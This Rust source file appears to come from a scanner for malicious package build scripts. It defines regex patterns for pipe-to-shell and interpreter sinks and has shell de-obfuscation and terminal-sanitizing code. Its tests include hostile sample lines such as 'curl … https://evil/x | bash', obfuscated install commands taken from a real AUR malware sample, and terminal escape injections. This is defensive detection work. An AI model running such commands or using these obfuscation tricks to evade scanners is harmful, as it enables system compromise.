/// Curated whole-word alternation of non-shell script interpreters that are
/// equally valid download-and-execute sinks (`curl … | python3`, `… | perl`, …).
/// Reused behind `{SHELL_LAUNCHER}{SHELL_PATH}` at the fetch-exec sink (pipe,
/// process-sub `<(curl)`, and `-c|-e` `"$(curl)"` forms). `python3.NN` is covered
/// by `python(?:3(?:\.\d+)?|2)?`.
///
/// Ordering matters only where one name prefixes another: `perl6` before `perl`,
/// `nodejs` before `node`, `Rscript` before the single-letter `R` (kept LAST).
///
/// The R-language names `Rscript` and the single-letter `R` are wrapped in
/// `(?-i:…)` so they match their CANONICAL upper-case spelling even when a
/// consumer compiles the whole pattern case-insensitively (as the
/// analyzer sinks now do). Without this, a case-insensitive `R` would match a
/// lower-case `r` — an extremely common token — and trip a `fetch | r` FP storm.
/// Every other member is a normal command name where case-folding is wanted
/// (`PYTHON`/`PERL`/`NODE` should match). The double-letter `bb` and the `awk`
/// family stay case-foldable: uppercase `BB`/`AWK` are not common false tokens
/// and every sink anchors them with `\b…\b` in command position. Non-capturing
/// for safe embedding.
pub const INTERPRETERS: &str = r"(?:powershell|runhaskell|runghc|python(?:3(?:\.\d+)?|2)?|pypy|perl6|perl|ruby|php|nodejs|node|luajit|lua|tclsh|wish|deno|bun|(?-i:Rscript)|julia|gawk|mawk|nawk|awk|groovy|expect|guile|scala|clojure|clj|racket|chicken|csi|elixir|iex|raku|crystal|babashka|bb|ts-node|tsx|pwsh|(?-i:R))";

/// Optional path prefix before a launcher word or a shell/interpreter, e.g.
/// `/bin/`, `/usr/bin/`. `\S+` is greedy and eats interior slashes, so
/// `/usr/bin/` is one segment. Lets `curl | /bin/sh` and `| /usr/bin/python3`
/// (the single most common shell path) be caught.
pub const SHELL_PATH: &str = r"(?:/\S+/)?";

/// Zero-or-more launcher/wrapper words (each optionally path-prefixed) that can
/// precede the real shell/interpreter at a SINK without changing that code is
/// being fed to it: `busybox sh`, `env sh`, `/usr/bin/env sh`, `command busybox
/// sh` (stacked launchers), `env -i sh`, `env FOO=bar sh`, `nice sh`, `stdbuf
/// -oL sh`. Repeatable (`*`) so stacked launchers are covered, and each launcher
/// may carry `-flags` and `VAR=val` assignments.
///
/// Prepend this (with `SHELL_PATH`) wherever `{SHELLS}`/`{INTERPRETERS}` is a SINK
/// so a launcher word or an absolute path can't smuggle the shell past the
/// matcher: `curl evil | busybox sh` / `| env sh` / `| /bin/sh` previously
/// produced ZERO findings. NOT folded into `SHELLS` itself, so the bare-name
/// behavior is unchanged. Linear-time (the `regex` crate has no backtracking) so
/// the nested `*` is ReDoS-free.
pub const SHELL_LAUNCHER: &str = r"(?:(?:/\S+/)?(?:busybox|toybox|env|command|exec|setsid|stdbuf|nice)\s+(?:-\S+\s+|\w+=\S*\s+)*)*";

/// Extra stdin-to-code sinks reachable right after a `|`, beyond a bare shell:
/// `. /dev/stdin` / `source /dev/stdin` (also `/dev/fd/0`, `/proc/self/fd/0`),
/// `xargs ... bash -c`, and `tee >(bash)` / `tee >(sh)`. Non-capturing; embed as
/// `\|\s*(?:{shell sink}|{pipe_sink_extra()})`.
pub fn pipe_sink_extra() -> String {
    format!(
        r"(?:(?:\.|source)\s+(?:/dev/stdin|/dev/fd/0|/proc/self/fd/0)(?:\s|;|&|\)|$)|xargs\b[^|;&\n]*?\b{SHELLS}\b|tee\b[^|\n]*?>\(\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b)"
    )
}

/// Anchor a command NAME to a position where a command can actually start:
/// the beginning of a logical line, after a shell separator (`;`, `&&`, `||`,
/// `|`), inside a subshell or command substitution, or after whitespace.
///
/// A bare command name in a regex is a substring match, and command names are
/// short. `nc\s+.*-c\s+` (the old SHELL-002 netcat rule) matched the `nc` at the
/// *end of the word* `MEGAsync` in
/// `git -C MEGAsync -c protocol.file.allow='always' submodule update`, reporting
/// a routine submodule checkout as a Critical reverse shell (issue #32).
/// Requiring a separator before the name makes `MEGAsync` unmatchable, because
/// the character before `nc` there is `y`.
///
/// An optional path prefix is included so `/usr/bin/nc` still matches. Rules
/// should follow this with the command name and a `\b`.
pub const CMD_START: &str = r"(?:^|[\s;&|(){}`])(?:/\S+/)?";

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn split_statements_respects_quotes_and_groups() {
        let s =
            |l: &str| -> Vec<String> { split_statements(l).into_iter().map(|(a, _)| a).collect() };
        assert_eq!(s("a=1; b=2 && c"), ["a=1", " b=2 ", " c"]);
        assert_eq!(s("echo 'a;b' \"c && d\""), ["echo 'a;b' \"c && d\""]);
        assert_eq!(s("x=$(a; b); y"), ["x=$(a; b)", " y"]);
        assert_eq!(
            s("cmd=(a b); \"${cmd[@]}\""),
            ["cmd=(a b)", " \"${cmd[@]}\""]
        );
        assert_eq!(s("ls 2>&1 | cat"), ["ls 2>&1 | cat"]);
        // rebuilding from statements + separators is lossless
        let l = "a=1; b=$(x | y) && c || d & e";
        let rebuilt: String = split_statements(l)
            .into_iter()
            .map(|(a, b)| a + &b)
            .collect();
        assert_eq!(rebuilt, l);
    }

    #[test]
    fn split_words_keeps_groups_together() {
        assert_eq!(
            split_words("local c=curl s=\"a b\" arr=(x y) z=$(a b)"),
            ["local", "c=curl", "s=\"a b\"", "arr=(x y)", "z=$(a b)"]
        );
    }

    #[test]
    fn deobfuscates_ansic_and_quote_splitting() {
        // The real AUR sample: cd /tmp && bun add ansi-colors-nextfile-js
        let line = r#"$'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a''d''d' $'\141\x6e''s'"i"-'c''o''l''o''r'$'\x73'"#;
        let d = deobfuscate(line).expect("should be flagged obfuscated");
        assert!(d.contains("cd /tmp"), "got: {d}");
        assert!(d.contains("bun add"), "got: {d}");
        assert!(d.contains("ansi-colors"), "got: {d}");
    }

    #[test]
    fn pure_quote_split_without_hex_is_caught() {
        // No \x at all — only word-splitting. OBF-003 would miss this entirely.
        let line = r#""b"'u''n' 'i''n''s''t''a''l''l' evilpkg"#;
        assert!(looks_obfuscated(line));
        assert!(deobfuscate(line).unwrap().contains("bun install"));
    }

    #[test]
    fn ordinary_quoted_strings_normalize_faithfully() {
        // De-obfuscation now normalizes every line (not just ones a narrow
        // heuristic flagged), so an ordinary quoted string DOES produce a decoded
        // variant -- but the decode is faithful: it only removes the quoting the
        // shell removes, leaving the exact command the shell would run (no
        // fabricated/merged tokens). This is what makes re-matching it safe.
        for (input, expected) in [
            (r#"echo "hello world""#, "echo hello world"),
            (
                r#"install -Dm755 "foo" "$pkgdir/usr/bin/foo""#,
                "install -Dm755 foo $pkgdir/usr/bin/foo",
            ),
            (r#"cd "$srcdir/pkg-$pkgver""#, "cd $srcdir/pkg-$pkgver"),
        ] {
            assert_eq!(
                deobfuscate(input).as_deref(),
                Some(expected),
                "faithful normalization of: {input}"
            );
        }
        // A line with no quoting/escaping at all is unchanged -> None.
        assert!(deobfuscate("make && make install").is_none());
        assert!(deobfuscate("ninja -C build").is_none());
    }

    #[test]
    fn two_char_quote_split_is_deobfuscated() {
        // Defect #6: the old single-char-only heuristic missed multi-char
        // adjacent-quote splitting. `"cu""rl"` must now decode to `curl`.
        assert_eq!(
            deobfuscate(r#""cu""rl" -fsSL https://evil/x | sh"#).as_deref(),
            Some("curl -fsSL https://evil/x | sh"),
        );
    }

    #[test]
    fn backslash_escaped_word_is_deobfuscated() {
        // Defect #6: a backslash-escaped word (`c\url`) bypassed the heuristic.
        // Outside quotes the shell drops the backslash, so it must decode.
        assert_eq!(
            deobfuscate(r#"c\url -fsSL https://evil/x | b\ash"#).as_deref(),
            Some("curl -fsSL https://evil/x | bash"),
        );
    }

    #[test]
    fn deobfuscate_text_preserves_line_numbers() {
        // Per-line de-obfuscation keeps a 1:1 line mapping so analyzers that
        // report a line still point at the right one.
        let text = "a=1\n\"cu\"\"rl\" evil\nb=2";
        let d = deobfuscate_text(text);
        let lines: Vec<&str> = d.lines().collect();
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[0], "a=1");
        assert_eq!(lines[1], "curl evil");
        assert_eq!(lines[2], "b=2");
    }

    #[test]
    fn shells_alternation_is_exhaustive() {
        // The curated whole-word SHELLS set must match every real shell in the
        // list (incl. the formerly-missed dash/ash/mksh and the long tail).
        let re = Regex::new(&format!(r"\|\s*{SHELLS}\b")).unwrap();
        for shell in [
            "sh", "bash", "rbash", "dash", "ash", "ksh", "ksh93", "mksh", "pdksh", "loksh", "oksh",
            "posh", "yash", "zsh", "csh", "tcsh", "fish", "xonsh", "elvish", "nu", "osh", "oil",
            "oils",
        ] {
            let s = format!("x | {shell}");
            assert!(re.is_match(&s), "SHELLS should match: {s}");
        }
        // Short/whole-word names must not over-match (the `\b…\b` discipline).
        let bounded = Regex::new(&format!(r"\b{SHELLS}\b")).unwrap();
        assert!(bounded.is_match("exec ash now"));
        assert!(bounded.is_match("run nu here"));
        for bad in [
            "a crash occurred",
            "make a splash",
            "run shellcheck",
            "pipe | number",
            "| oilcheck",
            "use nutool",
        ] {
            assert!(!bounded.is_match(bad), "must not match: {bad}");
        }
    }

    #[test]
    fn shell_sink_handles_launcher_and_path() {
        // The composed sink form `{LAUNCHER}{PATH}\b{SHELLS}\b` must catch a shell
        // reached via an absolute path and/or one or more launcher words, while
        // staying clean on non-shell sinks.
        let sink = Regex::new(&format!(r"\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b")).unwrap();
        for ok in [
            "x | sh",
            "x | /bin/sh",
            "x | /usr/bin/bash",
            "x | busybox sh",
            "x | busybox ash",
            "x | env sh",
            "x | /usr/bin/env sh",
            "x | env -i sh",
            "x | env FOO=bar sh",
            "x | command busybox sh",
            "x | /bin/busybox /bin/sh",
            "x | nice dash",
        ] {
            assert!(sink.is_match(ok), "shell sink should match: {ok}");
        }
        for bad in [
            "x | /usr/bin/tee f",
            "x | env grep foo",
            "x | nice make",
            "x | command ls",
            "x | /bin/number",
            "x | busybox cat",
        ] {
            assert!(!sink.is_match(bad), "shell sink must NOT match: {bad}");
        }
    }

    #[test]
    fn octal_and_hex_escapes_decode() {
        assert_eq!(normalize_shell_quoting(r"$'\141\x6e'"), "an"); // \141=a, \x6e=n
        assert_eq!(normalize_shell_quoting(r#"$'\x63'"d""#), "cd");
    }

    #[test]
    fn brace_scanner_ignores_quoted_braces() {
        // The `echo "}"` bypass: the quoted `}` must not close the function.
        let mut sc = BraceScanner::default();
        for line in ["build() {", "  echo \"}\"", "  payload", "}"] {
            sc.feed(line);
        }
        assert_eq!(sc.depth, 0, "function should be balanced, not closed early");
    }

    #[test]
    fn brace_scanner_counts_real_braces() {
        let mut sc = BraceScanner::default();
        sc.feed("f() { if true; then x; fi }");
        assert_eq!(sc.depth, 0);
        assert!(sc.peak >= 1, "peak records that a body was entered");
        let mut sc2 = BraceScanner::default();
        sc2.feed("f() {");
        assert_eq!(sc2.depth, 1);
    }

    #[test]
    fn brace_in_comment_does_not_close_function() {
        // The `}` in a trailing comment must not decrement depth and close the
        // function early (hiding code after it from the privilege analyzer).
        let mut sc = BraceScanner::default();
        for line in ["build() {", "  : # cosmetic note }", "  sudo evil", "}"] {
            sc.feed(line);
        }
        assert_eq!(
            sc.depth, 0,
            "comment brace must be ignored; body stays balanced"
        );
    }

    #[test]
    fn parameter_expansion_hash_is_not_a_comment() {
        // `${var#word}` and `$#` must keep their real braces counted.
        let mut sc = BraceScanner::default();
        sc.feed("cd \"${srcdir#x}/y\"");
        assert_eq!(sc.depth, 0, "param-expansion braces balance");
        let mut sc2 = BraceScanner::default();
        sc2.feed("f() { echo ${#args} }");
        assert_eq!(sc2.depth, 0);
    }

    #[test]
    fn plain_lines_unchanged() {
        let ll = logical_lines("a\nb\nc");
        assert_eq!(ll, vec![(1, "a".into()), (2, "b".into()), (3, "c".into())]);
    }

    #[test]
    fn splices_continuation_and_keeps_first_line_number() {
        // The classic bypass: the pipe-to-shell is on a continuation line.
        let ll = logical_lines("curl -fsSL https://evil/x \\\n  | bash");
        assert_eq!(ll.len(), 1);
        assert_eq!(ll[0].0, 1);
        assert!(ll[0].1.contains("curl") && ll[0].1.contains("| bash"));
    }

    #[test]
    fn even_backslashes_are_not_continuations() {
        // `foo\\` ends in an escaped backslash, not a line continuation.
        let ll = logical_lines("foo\\\\\nbar");
        assert_eq!(ll.len(), 2);
    }
}

/// Make untrusted text safe to print to a terminal.
///
/// Findings quote package-controlled data -- a source URL, a pkgname, a
/// maintainer handle, a matched snippet -- straight into their title and
/// description. Printed raw, an escape sequence in any of those fields is
/// executed by the terminal, and the tool whose entire job is showing a human
/// what is inside an untrusted file becomes the thing that lets the file
/// control the display. Cursor movement can overwrite the severity that was
/// just printed; SGR can recolour a Critical to look like the "ok" line above
/// it.
///
/// C0 controls (except tab), DEL, and the C1 range are replaced with a visible
/// `\xNN` escape, so nothing is silently dropped either -- a reviewer sees that
/// something odd was there. Newlines are removed rather than escaped in
/// single-line contexts by the caller; here they are preserved so multi-line
/// descriptions still wrap.
///
/// JSON and SARIF output do NOT need this: `serde_json` already escapes control
/// characters, and those consumers are programs, not terminals.
pub fn sanitize_for_terminal(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '\t' | '\n' => out.push(c),
            // C0 controls and DEL.
            c if (c as u32) < 0x20 || c as u32 == 0x7F => {
                out.push_str(&format!("\\x{:02X}", c as u32));
            }
            // C1 controls, which some terminals honour as escape equivalents.
            c if (0x80..=0x9F).contains(&(c as u32)) => {
                out.push_str(&format!("\\x{:02X}", c as u32));
            }
            c => out.push(c),
        }
    }
    out
}

#[cfg(test)]
mod sanitize_tests {
    use super::{
        classify_lines, logical_lines, sanitize_for_terminal, scan_line, split_lines, LexState,
    };

    #[test]
    fn strips_escape_sequences_from_untrusted_text() {
        let hostile = "https://example.com/\u{1b}[31mFAKE-CLEAN\u{1b}[0m/x.tar.gz";
        let safe = sanitize_for_terminal(hostile);
        assert!(!safe.contains('\u{1b}'), "ESC must not survive: {safe:?}");
        assert!(safe.contains("\\x1B"), "and must be visible: {safe:?}");
        // The readable content is preserved so the finding still makes sense.
        assert!(safe.contains("FAKE-CLEAN"));
    }

    #[test]
    fn neutralises_cursor_movement_and_carriage_return() {
        // \r alone can rewrite the current line, hiding a severity.
        let safe = sanitize_for_terminal("CRITICAL\rok      ");
        assert!(!safe.contains('\r'));
        assert!(safe.contains("CRITICAL"));
    }

    #[test]
    fn leaves_ordinary_text_alone() {
        for s in [
            "Curl pipe to shell",
            "source: https://github.com/alice/tool/archive/v1.0.tar.gz",
            "maintainer changed: alice -> bob",
            "pkgdesc with accents: configuración, 日本語",
            "a\ttabbed\tline",
            "multi\nline\ndescription",
        ] {
            assert_eq!(sanitize_for_terminal(s), s, "must not alter: {s:?}");
        }
    }

    #[test]
    fn neutralises_c1_controls() {
        let safe = sanitize_for_terminal("before\u{9b}31mafter");
        assert!(!safe.contains('\u{9b}'));
    }

    #[test]
    fn comment_trailing_backslash_does_not_join_next_line() {
        let ll = logical_lines("# note \\\ncurl x | bash\n");
        assert_eq!(ll.len(), 2, "{ll:?}");
        assert_eq!(ll[1], (2, "curl x | bash".to_string()));
        let ll = logical_lines("echo hi # trailing \\\ncurl x | bash\n");
        assert_eq!(ll.len(), 2, "{ll:?}");
        // `#` inside a word or expansion is not a comment.
        let ll = logical_lines("echo ${x#a} \\\nfoo\n");
        assert_eq!(ll, vec![(1, "echo ${x#a} foo".to_string())]);
    }

    #[test]
    fn heredoc_body_backslash_does_not_join() {
        let ll = logical_lines("cat <<'EOF'\nsee README \\\nEOF\ncurl x | bash\n");
        assert_eq!(ll.len(), 4, "{ll:?}");
        assert_eq!(ll[3], (4, "curl x | bash".to_string()));
    }

    #[test]
    fn trailing_pipe_and_logic_operators_join_with_alignment() {
        let ll = logical_lines("curl x |\n  # c\n\n  bash\nnext\n");
        assert_eq!(ll[0], (1, "curl x |   bash".to_string()));
        assert_eq!(ll[1], (5, "next".to_string()));
        let ll = logical_lines("a &&\nb ||\nc\nd\n");
        assert_eq!(ll.len(), 2);
        assert_eq!(ll[1].0, 4);
        // a quoted or escaped `|` does not continue
        assert_eq!(logical_lines("echo '|'\nx\n").len(), 2);
        assert_eq!(logical_lines("echo \\|\nx\n").len(), 2);
    }

    #[test]
    fn pipe_amp_is_normalized() {
        let ll = logical_lines("curl x |& bash\necho '|&' y\n");
        assert_eq!(ll[0].1, "curl x | bash");
        assert_eq!(ll[1].1, "echo '|&' y");
    }

    #[test]
    fn heredoc_openers_are_quote_comment_arith_aware() {
        let mut q = LexState::default();
        assert!(scan_line("echo '<<EOF'", &mut q).openers.is_empty());
        assert!(scan_line("echo \"<<EOF\"", &mut q).openers.is_empty());
        assert!(scan_line("true # cat <<EOF", &mut q).openers.is_empty());
        assert!(scan_line("x=$((1<<n))", &mut q).openers.is_empty());
        assert!(scan_line("(( x = 1 << y ))", &mut q).openers.is_empty());
        assert!(scan_line("cat <<< word", &mut q).openers.is_empty());
        let o = &scan_line("cat <<-\"E\"OF", &mut q).openers[0];
        assert_eq!(
            (o.delim.as_str(), o.quoted, o.strip_tabs),
            ("EOF", true, true)
        );
        let o = &scan_line("cat <<END-OF-NOTES", &mut q).openers[0];
        assert_eq!((o.delim.as_str(), o.quoted), ("END-OF-NOTES", false));
        let o = &scan_line("cat <<E\\OF", &mut q).openers[0];
        assert_eq!((o.delim.as_str(), o.quoted), ("EOF", true));
    }

    #[test]
    fn unterminated_heredoc_is_not_a_region() {
        let c = classify_lines(&["cat <<EOF", "text", "more"]);
        assert!(c.heredocs.is_empty());
        let c = classify_lines(&["cat <<-EOF", "\ttext", "\tEOF", "x"]);
        assert_eq!(c.heredocs.len(), 1);
        assert_eq!((c.heredocs[0].body_start, c.heredocs[0].end), (1, 2));
        // `<<` without `-` needs the terminator at column 0.
        let c = classify_lines(&["cat <<EOF", "text", "\tEOF"]);
        assert!(c.heredocs.is_empty());
    }

    fn openers(src: &str) -> usize {
        let mut q = LexState::default();
        scan_line(src, &mut q).openers.len()
    }

    #[test]
    fn nested_expansions_do_not_desync_quotes() {
        // inner `"` inside `$( )` inside `".."` must not close the outer quote
        let c = classify_lines(&[
            "_x=\"$(cat <<END",
            "\"; cat <<true",
            "END",
            ")\"",
            "code",
            "true",
        ]);
        assert_eq!(c.heredocs.len(), 1);
        assert_eq!((c.heredocs[0].body_start, c.heredocs[0].end), (1, 2));
        // `#` inside `${ }` is not a comment, and does not hide a quote
        let mut q = LexState::default();
        let s = scan_line("wget x ${p/ #/} \\", &mut q);
        assert!(s.continues);
        let mut q = LexState::default();
        scan_line("echo ${p/ #/}'", &mut q);
        assert!(q.is_open());
    }

    #[test]
    fn hash_after_metacharacters_is_a_comment() {
        for l in [
            "(:)# cat <<true",
            "a;# cat <<true",
            "a|# cat <<true",
            "a >#c <<true",
        ] {
            assert_eq!(openers(l), 0, "{l}");
        }
        assert_eq!(openers("echo a#b <<true"), 1);
    }

    #[test]
    fn numeric_delimiters_are_heredocs_outside_arithmetic() {
        assert_eq!(openers("cat <<1"), 1);
        assert_eq!(openers("x=$((1<<3))"), 0);
        assert_eq!(openers("x=$[1<<3]"), 0);
    }

    #[test]
    fn carriage_return_terminator_does_not_close() {
        let lines = split_lines("cat <<EOF\r\nbody\r\nEOF\r\ncode\r\n");
        assert_eq!(lines[2], "EOF\r");
        assert!(classify_lines(&lines).heredocs.is_empty());
        let lines = split_lines("cat <<EOF\nbody\nEOF\ncode\n");
        assert_eq!(classify_lines(&lines).heredocs.len(), 1);
    }

    #[test]
    fn unmodelled_constructs_mark_uncertain() {
        let c = classify_lines(&["x=`cat <<EOF", "EOF", "`"]);
        assert_eq!(c.uncertain_from, Some(0));
        let c = classify_lines(&["x=$(case a in a) echo;; esac)"]);
        assert_eq!(c.uncertain_from, Some(0));
        let c = classify_lines(&["echo $'a\\", "b'"]);
        assert_eq!(c.uncertain_from, Some(0));
        assert_eq!(classify_lines(&["echo hi", "ls"]).uncertain_from, None);
    }
}
